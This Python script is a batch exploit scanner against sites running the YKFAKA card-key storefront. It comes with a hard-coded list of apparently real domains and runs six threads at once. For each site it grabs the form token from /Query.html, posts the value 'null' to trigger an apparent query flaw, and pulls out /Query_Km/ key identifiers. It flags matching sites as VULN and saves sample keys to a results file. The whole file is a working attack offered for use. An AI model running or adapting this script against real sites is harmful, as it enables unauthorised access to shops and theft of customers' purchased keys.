#!/usr/bin/env python3
"""Batch probe YKFAKA null chain on domain list."""
import json
import re
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests

requests.packages.urllib3.disable_warnings()

TOKEN_RE = re.compile(
    r'name=["\']__token__["\'][^>]*value=["\']([^"\']+)["\']'
    r'|value=["\']([^"\']+)["\'][^>]*name=["\']__token__["\']'
)
KM_RE = re.compile(r"/Query_Km/([a-zA-Z0-9]{10,14})")


def probe_url(url):
    base = url.strip().rstrip("/")
    if not base.startswith("http"):
        base = "https://" + base
    r = {"url": base, "ts": time.strftime("%H:%M:%S")}
    s = requests.Session()
    s.verify = False
    s.headers.update({"User-Agent": "Mozilla/5.0"})
    try:
        home = s.get(base, timeout=15)
        r["home"] = home.status_code
        if "YKFAKA" not in home.text and "优卡" not in home.text:
            r["ykfaka"] = False
            return r
        r["ykfaka"] = True
        q = s.get(base + "/Query.html", timeout=15)
        if q.status_code != 200:
            r["query_fail"] = q.status_code
            return r
        tok = TOKEN_RE.search(q.text)
        if not tok:
            r["no_token"] = True
            return r
        token = tok.group(1) or tok.group(2)
        p = s.post(
            base + "/Query.html",
            data={"value": "null", "page": "1", "__token__": token},
            headers={"Referer": base + "/Query.html"},
            timeout=30,
        )
        r["null_len"] = len(p.text)
        r["blocked"] = "非法" in p.text
        kms = KM_RE.findall(p.text)
        r["km_count"] = len(kms)
        r["km_unique"] = len(set(kms))
        r["km_sample"] = list(set(kms))[:3]
        if kms:
            r["VULN"] = True
    except Exception as e:
        r["error"] = str(e)[:120]
    return r


def main():
    domains = sys.argv[1:] if len(sys.argv) > 1 else []
    if not domains:
        domains = [
            "https://dmdqq.cc",
            "https://meituan668.com",
            "https://q6666.xyz",
            "https://ttqq.top",
            "https://mima1314.com",
            "https://bwqq.top",
            "https://tjqq.top",
            "https://xmqqw.vip",
            "https://gao1314.com",
            "https://15118.cn",
            "https://123.taoqqhao.com",
        ]
    out = []
    with ThreadPoolExecutor(max_workers=6) as ex:
        futs = {ex.submit(probe_url, d): d for d in domains}
        for fut in as_completed(futs):
            res = fut.result()
            out.append(res)
            tag = "VULN" if res.get("VULN") else "ok"
            print(f"{tag} {json.dumps(res, ensure_ascii=False)}")
    path = "/data/automation/results/ykfaka_batch_20260801.json"
    with open(path, "w") as f:
        json.dump(out, f, ensure_ascii=False, indent=2)
    print("saved", path)


if __name__ == "__main__":
    main()
